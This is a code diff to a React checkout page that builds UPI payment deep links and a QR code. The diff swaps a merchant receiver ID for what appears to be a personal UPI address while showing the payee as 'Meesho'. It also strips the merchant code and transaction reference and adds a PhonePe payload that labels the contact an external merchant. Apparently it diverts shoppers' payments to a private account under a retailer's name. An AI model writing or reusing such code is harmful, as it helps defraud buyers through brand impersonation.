@@ -11,6 +11,7 @@ export default function PaymentPage() {
 
   const [showPaymentOptions, setShowPaymentOptions] = useState(false);
   const [showUPIApps, setShowUPIApps] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   const toNumber = (v) =>
     Number(String(v).replace(/[^\d.-]/g, "")) || 0;
@@ -30,14 +31,22 @@ export default function PaymentPage() {
 
   const totalAmount = price * qty + checkoutTotal;
 
+  const handleCopyUpi = () => {
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText("rajpatel1861997@okaxis");
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    }
+  };
+
   // =========================================
-  // UPI DETAILS (ICICI EAZYPAY MERCHANT)
+  // UPI DETAILS
   // =========================================
 
-  // Keep the receiver details in one place only.
-  const upiId = "eazypay.584736425@icici";
-  const payeeName = "SYFROX";
-  const merchantCode = "5045";
+  // Receiver details
+  const upiId = "rajpatel1861997@okaxis";
+  const payeeName = "Meesho";
+  const aid = "uGICAgOD1lfiuLw";
 
   // =========================================
   // OPEN UPI PAYMENT
@@ -56,7 +65,7 @@ export default function PaymentPage() {
     return `EZYS${Date.now().toString().slice(-6)}${Math.floor(1000 + Math.random() * 9000)}`;
   };
 
-  const openUPIApp = async (app = "upi") => {
+  const openUPIApp = (app = "upi") => {
     const amount = Number(totalAmount);
 
     if (!Number.isFinite(amount) || amount <= 0) {
@@ -72,76 +81,52 @@ export default function PaymentPage() {
     dispatch(setCartTotalAction(amount));
 
     const formattedAmount = amount.toFixed(2);
-    const uniqueTxnRef = `EZYS${Date.now().toString().slice(-8)}${Math.floor(10 + Math.random() * 90)}`;
     const orderNote = `Order_${Date.now()}`;
-    const pageUrl = window.location.href;
     const isIOS =
       typeof navigator !== "undefined" &&
       /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    // Official Google Pay Web (Payment Request API) for Android Chrome
-    if (app === "gpay" && !isIOS && typeof window !== "undefined" && window.PaymentRequest) {
-      try {
-        const supportedInstruments = [
-          {
-            supportedMethods: ["https://tez.google.com/pay"],
-            data: {
-              pa: upiId,
-              pn: payeeName,
-              mc: merchantCode,
-              tr: uniqueTxnRef,
-              url: pageUrl,
-            },
-          },
-        ];
-
-        const details = {
-          total: {
-            label: "Total Amount",
-            amount: {
-              currency: "INR",
-              value: formattedAmount,
-            },
-          },
-        };
-
-        const request = new window.PaymentRequest(supportedInstruments, details);
-        setShowPaymentOptions(false);
-        setShowUPIApps(false);
-
-        const result = await request.show();
-        await result.complete("success");
-        return;
-      } catch (err) {
-        console.warn("PaymentRequest could not be opened, falling back to deep link:", err);
-      }
-    }
-
-    // Full UPI parameter query matching official merchant specification
-    const fullMerchantQuery =
+    const baseUpiQuery =
       `pa=${encodeURIComponent(upiId)}` +
       `&pn=${encodeURIComponent(payeeName)}` +
-      `&mc=${encodeURIComponent(merchantCode)}` +
-      `&tr=${encodeURIComponent(uniqueTxnRef)}` +
-      `&url=${encodeURIComponent(pageUrl)}` +
+      `&aid=${encodeURIComponent(aid)}` +
       `&am=${formattedAmount}` +
       `&cu=INR` +
       `&tn=${encodeURIComponent(orderNote)}`;
 
     let paymentUrl = "";
 
-    if (app === "gpay") {
+    if (app === "phonepe") {
       if (isIOS) {
-        paymentUrl = `gpay://upi/pay?${fullMerchantQuery}`;
+        paymentUrl = `phonepe://pay?${baseUpiQuery}`;
       } else {
-        paymentUrl = `tez://upi/pay?${fullMerchantQuery}`;
+        const payload = {
+          p2pPaymentCheckoutParams: {
+            checkoutType: "COLLECT",
+            initialAmount: Math.round(amount * 100),
+            note: {
+              type: "text",
+              message: orderNote,
+            },
+            supportedInstruments: -1,
+          },
+          contact: {
+            type: "EXTERNAL_MERCHANT",
+            name: payeeName,
+            vpa: upiId,
+          },
+        };
+
+        const encodedPayload = btoa(
+          unescape(encodeURIComponent(JSON.stringify(payload)))
+        );
+
+        paymentUrl = `phonepe://native?data=${encodeURIComponent(encodedPayload)}&id=p2ppayment`;
       }
-    } else if (app === "phonepe") {
-      paymentUrl = `phonepe://pay?${fullMerchantQuery}`;
     } else if (app === "paytm") {
-      paymentUrl = `paytmmp://pay?${fullMerchantQuery}`;
+      paymentUrl = `paytmmp://pay?${baseUpiQuery}`;
     } else {
-      paymentUrl = `upi://pay?${fullMerchantQuery}`;
+      paymentUrl = `upi://pay?${baseUpiQuery}`;
     }
 
     setShowPaymentOptions(false);
@@ -433,6 +418,64 @@ export default function PaymentPage() {
             {/* UPI APP OPTION */}
             {/* ========================================= */}
 
+            {/* ========================================= */}
+            {/* QR CODE PAYMENT SECTION */}
+            {/* ========================================= */}
+            <div className="mb-5 border border-blue-200 bg-gradient-to-b from-blue-50/60 to-white rounded-2xl p-4 text-center shadow-sm">
+              <div className="flex items-center justify-between mb-3">
+                <div className="flex items-center gap-2">
+                  <span className="w-8 h-8 rounded-xl bg-blue-600 text-white flex items-center justify-center text-xs font-bold shadow-sm">
+                    QR
+                  </span>
+                  <div className="text-left">
+                    <p className="font-bold text-gray-900 text-sm">Scan to Pay via Any UPI App</p>
+                    <p className="text-[11px] text-gray-500">Google Pay, PhonePe, Paytm, BHIM</p>
+                  </div>
+                </div>
+                <span className="text-[11px] font-bold text-emerald-700 bg-emerald-100/80 px-2.5 py-0.5 rounded-full">
+                  Instant
+                </span>
+              </div>
+
+              {/* QR Code Container */}
+              <div className="bg-white p-3 rounded-2xl shadow-sm border border-gray-100 inline-block mx-auto my-1">
+                <img
+                  src={`https://api.qrserver.com/v1/create-qr-code/?size=240x240&margin=8&data=${encodeURIComponent(
+                    `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&aid=${aid}&am=${Number(totalAmount).toFixed(2)}&cu=INR`
+                  )}`}
+                  alt="UPI Payment QR Code"
+                  className="w-48 h-48 sm:w-52 sm:h-52 mx-auto object-contain rounded-lg"
+                />
+                <div className="mt-2 text-center">
+                  <p className="text-sm font-bold text-gray-900">₹{totalAmount}</p>
+                  <p className="text-[11px] text-gray-500 font-medium">{payeeName}</p>
+                </div>
+              </div>
+
+              {/* Copy UPI ID Box */}
+              <div className="mt-3 flex items-center justify-between bg-white border border-gray-200 rounded-xl px-3 py-2 text-left">
+                <div className="truncate pr-2">
+                  <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">UPI ID / VPA</p>
+                  <p className="text-xs font-semibold text-gray-800 truncate">{upiId}</p>
+                </div>
+                <button
+                  type="button"
+                  onClick={handleCopyUpi}
+                  className="shrink-0 px-3 py-1.5 bg-blue-600 hover:bg-blue-700 active:scale-95 text-white text-xs font-bold rounded-lg transition-all"
+                >
+                  {copied ? "Copied!" : "Copy"}
+                </button>
+              </div>
+
+              <p className="text-[11px] text-gray-500 mt-2">
+                Scan with Google Pay, PhonePe or Paytm to complete payment.
+              </p>
+            </div>
+
+            {/* ========================================= */}
+            {/* UPI APP OPTION */}
+            {/* ========================================= */}
+
             <button
               type="button"
               onClick={() => setShowUPIApps((prev) => !prev)}
@@ -444,7 +487,7 @@ export default function PaymentPage() {
                 hover:bg-blue-50
                 rounded-2xl
                 px-4
-                py-4
+                py-3.5
                 flex
                 items-center
                 justify-between
@@ -456,29 +499,29 @@ export default function PaymentPage() {
 
                 <div
                   className="
-                    w-12
-                    h-12
-                    bg-green-50
+                    w-11
+                    h-11
+                    bg-purple-50
                     rounded-xl
                     flex
                     items-center
                     justify-center
-                    text-sm
+                    text-xs
                     font-bold
-                    text-green-700
+                    text-purple-700
                   "
                 >
-                  UPI
+                  APP
                 </div>
 
                 <div className="text-left">
 
-                  <p className="font-semibold text-black text-base">
-                    Pay via UPI App
+                  <p className="font-semibold text-black text-sm">
+                    Pay via UPI App Directly
                   </p>
 
-                  <p className="text-sm text-gray-500">
-                    Google Pay, PhonePe or Paytm
+                  <p className="text-xs text-gray-500">
+                    PhonePe, Paytm, BHIM & more
                   </p>
 
                 </div>
@@ -505,64 +548,6 @@ export default function PaymentPage() {
                   overflow-hidden
                 "
               >
-
-                {/* GOOGLE PAY */}
-
-                <button
-                  type="button"
-                  onClick={() => openUPIApp("gpay")}
-                  className="
-                    w-full
-                    px-4
-                    py-4
-                    flex
-                    items-center
-                    justify-between
-                    bg-white
-                    hover:bg-gray-50
-                    border-b
-                    border-gray-100
-                    transition-all
-                  "
-                >
-
-                  <div className="flex items-center gap-3">
-
-                    <div
-                      className="
-                        w-11
-                        h-11
-                        rounded-full
-                        bg-gray-100
-                        flex
-                        items-center
-                        justify-center
-                        font-bold
-                        text-blue-600
-                      "
-                    >
-                      G
-                    </div>
-
-                    <div className="text-left">
-
-                      <p className="font-semibold text-black">
-                        Google Pay
-                      </p>
-
-                      <p className="text-xs text-gray-500">
-                        Pay ₹{totalAmount}
-                      </p>
-
-                    </div>
-
-                  </div>
-
-                  <span className="text-2xl text-gray-400">
-                    ›
-                  </span>
-
-                </button>
 
                 {/* PHONEPE */}
 
